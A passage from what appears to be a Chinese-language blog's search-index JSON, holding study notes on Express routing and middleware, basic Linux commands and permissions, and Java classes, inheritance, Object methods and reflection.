","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:6","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 路由express中的路由分 3 部分组成，分别是请求的类型、请求的 URL 地址、处理函数 app.METHOD(PATH,HANDLER) app.get(\"/\",(req.res)=\u003e{ res.send(\"Hello World\") })sss app.post(\"/\",(req,res)=\u003e{ res.send(\"Hello Worlds\") }) 模块化将路由抽离为单独的模块 创建路由模块对应的 js 文件 调用express.Router()函数创建路由对象 向路由对象上挂载具体的路由 使用module.exports向外共享路由的对象 使用app.use()函数注册路由模块 创建路由模块 var express = require(\"express\") var router = express.Router router.get('/user/list',(req,res)=\u003e{ res.send(\"Get user list\") }) router.post('/user/add',(req,res)=\u003e{ res.send('Add new user.') }) module.exports = router 注册路由模块 const userRouter = require(\"./route.js\") app.use(userRouter) app.use()函数的作用，就是来注册全局中间件 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:7","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 中间件当一个请求到达 Express 的服务器之后，可以连续调用多个中间件，从而对这次请求进行预处理 客户端发起的任何请求，到达服务器之后，都会触发的中间件，叫做全局生效的中间件 通过调用app.use(中间件函数)，即可定义全局生效的中间件函数 最简单的中间件函数 const mw = function(req,res,next){ console.log('中间件函数') next() } 局部生效的中间件，不使用 app.use() 定义的中间件 const mw = function(req,res,next){ console.log('中间件函数') next() } app.get('/',mw,function(req,res){ res.send(\"Hello World\") }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:8","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["运维"],"content":" 开关机shutdown关机 sync # 将数据由内存同步到硬盘中 shutdown # 关机指令 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:1:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 系统目录架构1、一切皆文件 2、根目录/，所有的文件都挂载在这个节点下 目录解释 /bin # bin是 binary 的缩写，这个目录存放着最常使用的命令 /boot # 这里存放的是启动Linux时使用的一些核心文件，包括一些连接以及镜像文件 /dev # dev是device的缩写，存放的是Linux的外部设备，在Linux中方问设备的方式和访问文件的方式是相同的 /etc # 这个目录用来存放所有的系统管理所需要的配置文件和子目录 /home # 用户的主目录，在linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的 /lib # 这个目录存放着系统最基本的动态连接共享库 /proc # 这个目录是一个虚拟的目录，他是系统内存的映射，我们可以直接访问这个目录来获取系统信息 /root # 系统管理员的目录 /usr # 用户的很多应用程序和文件都存在这个目录下 /usr/bin # 系统用户使用的应用程序 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:2:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 常用的基本命令","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:3:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 目录管理 cd / # 切换到根目录 绝对路径 cd ../ #切换到上一级目录 相对路径 ls # 列出目录 -a # all 查看全部文件，包括隐藏文件 -l # 列出所有文件，包括属性 pwd # 显示当前所在的目录 mkdir #创建目录 -p # 创建多级目录 rmdir #删除目录 仅能删除空的目录 rmdir -p # 删除多级目录 cp # 复制文件或者目录 cp oldfile newfile rm # 移除文件或者目录 -f # 忽略不存在的文件，不会出现警告，强制删除 -r # 递归删除 mulu -i # 互动，删除询问是否删除 mv # 移动文件或者目录 / 重命名文件 -f # 强制移动 -u # 只替换已经更新过的文件 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:3:1","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 基本属性 f10wers13eicheng@MacBookPro [21时49分24秒] [~/Desktop/题目] -\u003e % ls -l total 8 drwxr-xr-x 3 f10wers13eicheng staff 96 2 2 00:17 assets drwxr-xr-x 6 f10wers13eicheng staff 192 2 2 00:20 deploy -rw-r--r--@ 1 f10wers13eicheng staff 2974 2 2 00:22 writeup.md // d 是目录 // - 是文件 // I 是链接文档 // b 是配置文件里面的可供存储的接口设备 // c 是配置文件里面的串行端口设备，例如键盘、鼠标等 // 接下来的字符中，以三个为一组，且均为[rwx]的三个参数组合 // 其中r代表可读 w代表可写 x代表可执行 // 如果没有权限，则会出现\"-\" ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:3:2","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 修改文件属性chgrp 更改文件属性 chgrp [-R] 属组名 文件名 -R递归更改文件属组 chown更改文件属主，也可以同时更改文件属组 chown [-R] 属主名 文件名 chown [-R] 属主名:属组名 文件名 chmod [-R] xyz 文件/目录 r:4 w:2 x:1 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:3:3","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" 文件内容查看 cat #由第一行开始显示文件内容 tac #由最后一行开始显示 nl #显示的时候，顺道输出行号 more #一页页的显示文件内容 less #可以往前翻页，其他与 more 相似 head #只看头几行 tail #只看尾巴几行 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:4:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux 链接概念Linux 链接分为两种 硬链接、软连接 硬链接 A—B 假设 B 是 A 的硬链接，那么他们两个指向了同一个文件，允许一个文件拥有多个路径。 软连接 类似 Windows 下的快捷方式，删除源文件，快捷方式也访问不了 创建链接命令 ln ln -s file link #软连接 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:5:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux账号管理添加用户 useradd 选项 用户名 -m 自动创建这个用户的主目录 -G 指定用户组 删除用户 userdel -r 用户名 -r 删除目录 修改用户 usermod 选项 用户名 切换用户 su username ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:6:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux用户组管理/etc/group 创建一个用户组 groupadd 组名 -g id 指定id 删除用户组 groupdel 组名 修改用户组的权限和信息 groupmod -g id -n newname oldname 用户切换用户组 # 登录当前用户 # newgrp root ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:7:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux磁盘管理df列出文件系统整体的磁盘使用量 du检查磁盘空间使用量 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:8:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["运维"],"content":" Linux进程管理在 Linux 中，每一个程序都是有自己的一个进程，每一个进程都有一个 id 号 每一个进程，都会有一个父进程 ps 查看当前系统中正在进行的各种进程信息 -a 显示当前终端运行的所有的进程信息 -u 以用户的信息显示进程 -x 显示后台运行进程的参数 ps -ef 可以查看到父进程的信息 pstree -pu -p 显示父id -u 显示用户组 杀掉进程 kill -9 pid 强制杀掉进程 ","date":"2024-02-03","objectID":"/linux%E5%9F%BA%E7%A1%80/:9:0","tags":["Linux"],"title":"Linux基础","uri":"/linux%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" for each循环for(variable:collection)statement eg public class Main { public static void main(String[] args) { int[] a = new int[100]; for(int i = 0;i\u003c100;i++){ a[i] = i; } for(int element:a) System.out.println(element); } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:0:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 数组初始化以及匿名数组int[] smallPrimes = {2,3,5,7,11,13}; new int[] {17.19.20}; 对象与类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:0:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 使用预定义类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:1:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 对象与对象变量new Date Date类中有一个toString方法，这个方法将返回日期的字符串描述 String s = new Date.toString() 在这两个例子中，构造的对象仅使用了一次，通常，希望构造的对象可以多次使用，因此，需要讲对象存放在一个变量中 Date birthday = new Date(); 在对象与对象变量之间存在着一个重要的区别 Date deadline 定义了一个对象变量deadline，它可以引用Date 类型的对象。但是，一定要认识到：变量deadline不是一个对象，实际上也没有引用对象。此时，不能将任何Date 方法应用于这个变量上。语句 s = deadline.toString(); // not yet 必须首先初始化变量deadline，这里有两个选择。当然，可以用新够早的对象初始化这个变量 deadline = new Date(); ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:1:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 用户自定义类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:2:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" Employee类 import java.time.LocalDate; public class Employee { public static void main(String[] args) { Employee[] staff = new Employee[3]; staff[0] = new Employee(\"Tom\",1000,1987,12,15); staff[1] = new Employee(\"Jim\",2000,1988,12,15); staff[2] = new Employee(\"Helen\",3000,1989,12,15); for(Employee e : staff) e.raiseSalary(5); for(Employee e : staff) System.out.println(\"name=\"+e.getName()+\",salary=\"+ e.getSalary()+\",hireDay=\"+ e.getHireDay()); } private String name; private double salary; private LocalDate hireDay; // constructor public Employee(String n,double s,int year,int month,int day){ name = n; salary = s; hireDay = LocalDate.of(year,month,day); } // method public String getName(){ return name; } public double getSalary(){ return salary; } public LocalDate getHireDay(){ return hireDay; } public void raiseSalary(double byPercent){ double raise = salary * byPercent / 100; salary += raise; } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:2:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 从构造器开始 public Employee(String n,double s,int year,int month,int day){ name = n; salary = s; LocalDate hireDay = LocalDate.of(year,month,day); } 可以看到构造器与类同名。在构造Employee类的对象时，构造器会运行，以便将实例域初始化所希望的状态 构造器与其他的方法有一个重要的不同。构造器总是伴随着new操作符的执行被调用，而不能对一个已经存在的方法调用构造器来达到重新设置实例域的目的。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:2:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" final实例域可以将实例域定义为 final。构造对象时必须初始化这样的域。也就是说，必须确保在每一个构造器执行之后，这个域的值被设置，并且在后面的操作中，不能够再对它进行修改。例如，可以将Employee类中的 name 域声明为 final，因为在对象构建之后，这个值不会再被修改，即没有setName方法。 class Employee{ private final String name; } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:2:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 静态域与静态方法在前面给出的示例程序中，main方法都被标记为static修饰符。下面讨论一下这个修饰符 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:3:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 静态域如果将域定义为 static，每个类中只有一个这样的域。而每一个对象对于所有的实例域却都有自己的一份拷贝。例如，假定需要给每一个雇员赋予唯一的标识码。这里给Employee 类添加一个实例域id和一个静态域netxId; class Employee{ private static int nextId = 1; private int id; } 现在，每一个雇员对象都有一个自己的id域，但这个类的所有实例将共享一个 nextId域。换句话说，如果有 1000 个Employee类的对象，则有1000个实例域 id。但是，只有一个静态域nextId。即使没有一个雇员对象，静态域netxtId也存在。它属于类，而不属于任何独立的对象。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:3:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 静态常量例如 public class Math{ public static final double PI = 3.1415926585; } 在程序中，可以才用Math.PI的形式获得这个常量 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:3:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 静态方法静态方法是一种不能向对象实施操作的方法，例如Math 类的pow方法就是一个静态方法 Math.pow(x,a) 计算 x 的 a 次方 main 方法也是就一个静态方法 public class Application{ public static void main(String args[]){ //constructor objects here } } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:3:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 对象构造","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:4:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 重载有些类有多个构造器。例如，可以构造如下一个空的StringBuilder 对象 StringBuilder messages = new StringBuilder() 或者，可以指定一个初始化字符串 StringBuilder todoList = new StringBuilder(\"To do\"); 这种特征叫做重载。如果多个方法有相同的名字、不同的参数，便产生了重载。编译器必须挑出具体执行哪个方法，它通过用各个方法给出的参数类型与特定方法调用所使用的值类型进行匹配来挑选出相应的方法。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:4:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 初始化块在构造器中设置值 在声明中赋值 实际上，Java 还有第三种机制，称为初始化块。在一个类的声明中可以包含多个代码快。只要构造类的对象，这些块就会被执行。例如 class Employee{ private static int nextId; private int id; private String name; private double salary; { id = nextId; nextId++ } public Employee(String n,double s){ name = n; salary = s; } public Employee(){ name=\"\"; salary= 0; } } 在这个示例中，无论是用哪个构造器构造对象，id 域都在对象初始化块中被初始化。先运行初始化块，然后才运行构造器的主体部分。 这种机制是不必需的，也不常见。通常会直接将初始化代码放在构造器中。 如果对类的静态域进行初始化的代码比较复杂，那么可以使用静态的初始化块。 将代码放在一个块中，并标记关键字 static。下面是一个示例。其功能是将雇员ID的起始值赋予一个小于 10000 的随机整数 static{ Random generator = new Random(); nextId = generator.nextInt(10000); } 在类第一次加载的时，将会进行静态域的初始化。与实例域一样，除非将它们显示地设置成其他值，否则默认的初始化值是 0、false、或null。所有静态初始化语句以及静态初始化块都将依照类定义的顺序执行。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:4:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 对象析构与 finalize方法如果某个资源需要在使用完毕后立刻被关闭， 那么就需要由人工来管理。对象用完时， 可以应用一个 close 方法来完成相应的清理操作。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:4:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 包","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:5:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 类的导入一个类可以使用所属包中所有的类，以及其他包中的公有类。我们可以采用两种方式访问另一个包中的公有类。第一种方式是在每个类名之前添加完整的包名。 例如 java.time.LocalDate today = java.time.LocalDate.now(); 这很繁琐。更简单常用的方式是使用import语句。import语句是一种引用包含在包中的类的简单描述。一旦使用了import语句，在使用类时，就不必写出包的全名了。 可以使用 import 语句导入一个特定的类或者整个包。import语句应该位于源文件的顶部(但位于 package 语句的后面)。例如，可以使用下面这条语句导入java.util包中所有的类。 import java.util.* 然后，就可以使用 LocalDate today = LocalDate.now() 继承","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:5:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 类、超类和子类","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 定义字类继承Employee类来定义Manager类的格式，关键字 extends 表示继承。 public class Manager extends Employee{ } 关键字extends表明正在构造的新类派生于一个已存在的类。已存在的类称为超类(superclass)、基类(base class)或者父类(parent class)；新类称为字类(subclass)、派生类(derived class)。超类和子类是Java 程序员最常用的两个属于， 尽管Employee类是一个超类，但并不是因为它优于子类或者拥有比子类更多的功能。而恰恰相反，子类拥有比父类更丰富的功能。 在Manager类中，增加了一个用于存储奖金信息的域，以及一个用于设置这个域的新方法 public class Manager extends Employee{ private double bonus; public void setBonus(double bonus){ this.bonus = bonus; } } 这里定义的方法和域并没有什么特别之处。如果有一个Manger 对象，就可以使用 setBonus 方法 当然，由于setBonus方法不是在Employee类中定义的，所以属于Employee类的对象不能使用 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 覆盖方法然而，超类中的有些方法对字类Manager并不一定适用。具体来说，Manager类中的getSalary方法应该返回薪水和奖金的总和。为此，需要提供一个新的方法来覆盖超类中的这个方法 这里主要是利用super去调用父类中private作用域的getSalary方法 public double getSalary(){ double baseSalary = super.getSalary(); return baseSalary + bonus; } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 子类构造器在例子的最后，我们来提供一个构造器 public Manager(String n,double s,int year,int month,int day){ super(n，s,year,month,day); bonus = 0; } 这里的关键字super具有不同的含义。语句 super(n,s,year,year,month,day) 是调用超类Employee中含有n,s,year,month,day的参数构造器的简写形式 由于Manger类的构造器不能访问Employee类的私有域，所以必须利用Employee类的构造器对这部分私有域进行初始化，我们可以通过 super 来实现对超类构造器的调用。使用super调用构造器的语句必须是子类构造器的第一条语句 如果子类的构造器没有显式地调用超类的构造器，则将自动地调用超类默认(没有参数)的构造器。如果超类没有不带参数的构造器，并且在子类构造其中又没有显式地调用超类的其他构造器，则Java 编译器则报告错误 编写一个demo Manager boss = new Manager(\"Tom\",8000,1988,12,15); boss.setBonus(1000); Employee[] staff = new Employee[3]; staff[0] = boss; staff[1] = new Employee(\"Jim\",1000,1985,12,16); staff[2] = new Employee(\"Lara\",1000,1985,12,16); for(Employee e:staff) System.out.println(\"name=\"+e.getName()+\"salary=\"+e.getSalary()); 需要关注的是e.getSalary() 调用能够确定应该执行哪个getSalary方法。请注意，尽管这里将e声明为Employee类型，但实际上 e 既可以引用Employee 类型的对象，也可以引用Manger 类型的对象。 当 e 引用 Employee 对象时， e.getSalary( ) 调用的是 Employee 类中的 getSalary 方法; 当 e 引用 Manager 对象时， e.getSalary( ) 调用的是 Manager 类中的 getSalary 方法。 虚拟机知道 e 实际引用的对象类型， 因此能够正确地调用相应的方法。 一个对象变量(例如， 变量 e) 可以指示多种实际类型的现象被称为多态(polymorphism)。 在运行时能够自动地选择调用哪个方法的现象称为动态绑定(dynamic binding。) ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 继承 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:4","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 多态 Employee e; e = new Employee(. . .); // Employee object expected e = new Manager(. . .); // OK, Manager can be used as well 在Java 程序语言设计中，对象变量是多态的。一个Employee变量既可以引用Employee 类对象，也可以引用一个Employee 类的任何一个子类的对象 置换法则 Manager boss = new Manager(. . .); Employee[] staff = new Employee[3]; staff[0] = boss; 在这个例子中，变量 staff[0]与boss引用同一个对象。但编译器将 staff[0]看成Employee对象。 这意味着，可以这样调用 boss.setBonus(5000); //OK 但不能这样调用 staff[0].setBonus(5000) //Error 这是因为staff[0]声明的类型是Employee，而setBonus 不是Employee 类的方法 然而，不能将一个超类的引用赋给子类变量。例如，下面的赋值是非法的。 Manager m = staff[i] //Error ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:5","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 阻止继承 ：final 类和方法如果不希望Executive有子类，那么需要在前面加上 final 来修饰 public final class Executive extends Manger{} 类中的特定方法也可以被声明为final。如果这样做，字类就不能覆盖这个方法 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:6","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 强制类型转换Java 中提供了一种专门用于进行类型转换的表示法 double x = 3.4; int nx = (int) x; 对象引用的转换方法与数值表达式的类型转换类似，仅需要一对圆括号将目标类名括起来，并放置在需要转换的对象引用之前就可以了。例如： Manager boss = (Manager) staff[0]; 只能在继承层次内进行类型转换 在将超类转换成子类之前，应该使用instanceof进行检查 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:7","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 抽象类使用abstract关键字，定义抽象类 public abstract String getDescription(); // no implementation required 为了提高程序的清晰度，包含一个或多个抽象方法的类本身必须被声明为抽象的。 public abstract class Person{ public abstract String getDescription(); } 除了抽象方法之外，抽象类还可以包含具体数据和具体方法。例如，Person 类还保存着姓名和一个返回姓名的具体方法 public abstract class Person{ private String name; public Person(String name){ this.name = name; } public abstract String getDescription(); public String getName(){ return name; } } 抽象方法充当着占位的角色，它们的具体实现在子类中。扩展抽象类可以有两种选择。一种是在抽象类中定义部分抽象类方法或不定义抽象类方法，这样就必须将子类也标记为抽象类，另一种是定义全部的抽象方法，这样一来，子类就不是抽象的了。 写一个Demo Main.java public class Main { public static void main(String[] args) { Person[] people = new Person[2]; people[0] = new Student(\"Jim\"); people[1] = new Employee(\"Tom\"); for(Person p:people) System.out.println(\"This is description:\"+p.getDescription()); } } Employee.java public class Employee extends Person{ private String name; // constructor public Employee(String n){ super(n); } // method public String getDescription(){ return \"I'm a Employee\"; } } Student.java public class Student extends Person{ public Student(String name){ super(name); } public String getDescription(){ return \"I'm a Student\"; } } p.getDescription()这里不是调用了一个没有定义的方法吗？由于不能构造抽象类Person 的对象，所以变量 p永远不会引用Person 对象，而是引用诸如Employee或者Student 这样的具体子类对象，而这些对象中都定义了getDescription方法 4个访问修饰符 仅对本类可见-private 对所有类可见-public 对本包和所有子类可见-protected 对本包可见-默认，不需要修饰符 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:6:8","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" Object：所有类的超类Object 类是Java 中所有类的始祖，在Java 中每个类都是由它扩展而来的。但是并不需要这样写 public class Employee extends Object 如果没有明确地指出超类，Object 就被认为是这个类的超类。由于在Java 中，每个类都是由Object 类扩展而来的，所以，熟悉这个类提供的所有服务十分重要。 可以使用Object类型的变量引用任何类型的对象: Object obj = new Employee(\"Jim\",10000); 当然，Object 类型的变量只能用于作为各种值的通用持有者。要想对其中的内容进行具体的操作，还需要清楚对象的原始类型，并进行相应的类型转换： Employee e = (Employee) obj; 在Java 中，只有基本类型(primitive types)不是对象，例如，数字、字符和布尔类型的值都不是对象。 所有数组类型，不管是对象数组还是基本类型的数组都扩展了Object类。 Employee[] staff = new Employee[10]; obj = staff;//ok obj = new int[10]; //ok ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:7:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" equals方法Object类中的equals方法用于检测一个对象是否等于另一个对象。在Object类中，这个方法将判断两个对象是否具有相同的引用。如果两个对象具有相同的引用，它们一定是相等的。从这点上看，将其作为默认操作也是合乎情理的。然而，对于多数类来说，这种判断并没有什么意义。例如，采用这种方式比较两个PrintStram对象是否想等就完全没有意义。然而，经常需要检测两个对象状态的相等性，如果两个对象的状态相等，就认为这两个对象是相等的。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:7:1","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" hashCode 方法散列码(hash code)是由对象导出的一个整型值。散列码是没有规律的。如果 x 和 y 是两个不同的对象，x.hashCode()与y.hashCpde()基本上不会相同。 String 类使用下列算法计算散列码 int hash = 0; for(int i = 0;i \u003c length();i++) hash = 31*hash + charAt(i); 由于hashCode方法定义在Object 类中，因此每个对象都有一个默认的散列码，其值为对象的存储地址。来看下面这个例子。 String s = \"Ok\"; StringBuilder sb = new StringBuilder(s); System.out.println(s.hashCode()+\" \"+sb.hashCode()); String t = new String(\"Ok\"); StringBuilder tb = new StringBuilder(t); System.out.println(t.hashCode()+ \" \" +tb.hashCode()); 字符串 t 和 s 拥有相同的散列码，这是因为字符串的散列码是由内容导出的。而字符串缓冲 sb 与 tb 却有着不同的散列码，这是因为在StringBuffer 类中没有定义 hashCode 方法，它的散列码是由Object 类的默认 hashCode 方法导出的对象存储地址。 如果重新定义 equals 方法，就必须重新定义 hashCode 方法，以便用户可以将对象插入到散列表中。 hashCode 方法应该返回一个整型数值，并合理地组合实例域的散列码，以便能够让各个不同的对象产生的散列码更加均匀。 public class Employee{ public int hashCode(){ return 7*name.hashCode() +11*new Double(salary).hashCode() +13*hireDay.hashCode(); } } 不过，还可以做得更好。首先，最好是用 null 安全的方法Object.hashCode。如果其参数为 null，这个方法会返回 0，否则返回对参数调用 hashCode 的结果。 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:7:2","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" toString方法在Object 类中还有一个重要的方法，就是 toString 方法，它用于返回表示对象值的字符串。下面是一个典型的例子。Point 类的 toString 方法将返回下面这样的字符串： java.awt.Point[x=10,y=20] 绝大多数的toString方法都遵循这样的格式：类的名字，随后是一对方括号括起来的域值。下面是Employee 类中的toString 方法的实现 public String toString(){ return \"Employee[name=\" + name +\"]\"; } ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:7:3","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 泛型数组列表ArrayList是一个采用类型参数的泛型类。为了指定数组列表保存的元素对象类型，需要用一堆尖括号将类名括起来加在后面，例如，ArrayList\u003cEmployee\u003e。 下面声明和构造一个保存Employee 对象的数组列表 ArrayList\u003cEmployee\u003e staff = new ArrayList(); 使用add方法可以将元素添加到数组列表中 staff.add(new Employee(\"Jim\",...)); 如果已经清楚或能够估计出数组可能存储的元素数量， 就可以在填充数组之前调用 ensureCapacity 方法: staff.ensureCapacity(lOO); 这个方法调用将分配一个包含 100 个对象的内部数组。然后调用 100 次 add, 而不用重新分 配空间。 另外， 还可以把初始容量传递给 ArrayList 构造器: ArrayList\\\u003cEmployee\\\u003e staff = new ArrayListo(lOO); staff.size()返回数组列表中包含的实际元素数目 访问数组列表元素使用get和set方法实现访问或改变数组元素的操作，而不使用人们喜爱的[]语法格式 例如设置第i个元素，可以使用 staff.set(i.harry) 它等价于对数组 a 的元素赋值(数组的下标从 0 开始) a[i] = harry 使用下列格式获得数组列表的元素 Employee e = staff.get(i); ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:8:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" 反射反射机制可以用来 在运行时分析类的能力 在运行时查看对象，例如，编写一个 toString 方法供所有类使用 实现通用的数组操作代码 利用Method 对象，这个对象很像C++的函数指针 ","date":"2024-02-03","objectID":"/java%E5%9F%BA%E7%A1%80/:9:0","tags":["Java"],"title":"Java基础","uri":"/java%E5%9F%BA%E7%A1%80/"},{"categories":["开发"],"content":" Class 类可以通过专门的Java类访问这些信息。保存这些信息的类被称为Class，这个名字很容易让人混淆。Object类中的 getClass()方法将会返回一个Class 类型的实例 Employee e; Class cl = e.getClass(); 可以调用静态方法 forName 获得类名对应的Class 对象 String className = 'java.util.Random'; Class cl = Class.forName(className); 获得Class类对象的第三种方法很简单， Class cl1 = Random.class; 还有一个很有用的方法newInstance()，可以用来动态地创建一个类的实例 